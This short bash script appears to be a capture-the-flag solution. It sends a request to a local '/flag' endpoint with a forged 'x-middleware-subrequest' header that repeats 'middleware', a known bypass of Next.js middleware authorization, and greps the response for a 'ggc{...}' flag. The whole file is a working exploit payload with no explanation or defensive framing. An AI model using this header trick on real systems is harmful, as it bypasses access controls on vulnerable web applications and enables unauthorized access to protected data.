#!/bin/bash
curl localhost:3000/flag -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" | grep -oE 'ggc\{[^}]+\}'
